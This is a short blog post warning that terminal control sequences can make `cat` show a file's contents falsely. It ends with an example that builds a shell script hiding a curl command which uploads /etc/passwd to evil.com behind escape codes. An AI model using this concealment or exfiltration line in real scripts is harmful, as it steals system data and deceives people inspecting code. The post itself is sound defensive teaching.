---
title: Don't trust `cat`!
tags: []
summary: >-
  `cat` can hide malicious content behind terminal control sequences, so you
  should not trust its visual output. Use `less` or `hexdump` to inspect files
  instead.
---

To read a file `foo` in the terminal, we do `cat foo`, and the contents of the file are printed out. But because terminal control sequences are _in-band_ as ordinary stdout bytes, `cat`ting a file can do more than you think! You should not trust the visual output of cat as a faithful representation of the file contents.

This program clears the screen:

```c
#include <stdio.h>
int main() { printf("\033c"); return 0; }
```

We can achieve the same thing with the `printf` program in the CLI:

```bash
printf "\033c"  # Clears the screen
```

Because those are just bytes over stdout, we can write them to a file, and read from the file. This does the same thing and clears the screen:

```bash
printf "\033c" > clear_screen
cat clear_screen  # Clears the screen
```

There are all kinds of ANSI control sequences; you should consider the byte stream to have arbitrary control over your screen.

A file could look like a normal plaintext file with `cat`, but contain secret other bytes. Here's an example using the sequence `<ESC>[9D`, which deletes the previous 9 characters.

```
$ printf "invisible\033[9Dsome boring plaintext\n" > boring
~/dev/tmp/clear
$ cat boring
some boring plaintext
```

This is a clear opportunity for malicious files. The following constructs a shell file which looks innocent, but contains a secret command which uploads sensitive files to a remote server:

```
$ printf 'curl --data-binary @/etc/passwd https://evil.com;\033[2K\033[49Decho "You look great!"\n' > hello.sh
$ chmod +x hello.sh
$ cat hello.sh
echo "You look great!"
$ ./hello.sh  # Uh-oh
```

The shell chokes once it reaches the escape sequences, but by then it's too late: the shell has already run the malicious command and our secrets are leaked!

First, the file contains the malicious command, which is 49 characters long. Next, it has the escape sequence `<ESC>[2K` which clears the current line, then the escape sequence `<ESC>[49D` to delete the previous 49 characters. At this point, we're back to looking like a blank file. Finally we put in some nice-looking commands to convince the user to run the file.

Don't trust `cat`! If there's any possibility of malice, then inspect the file with `less`, or even `hexdump -C`.
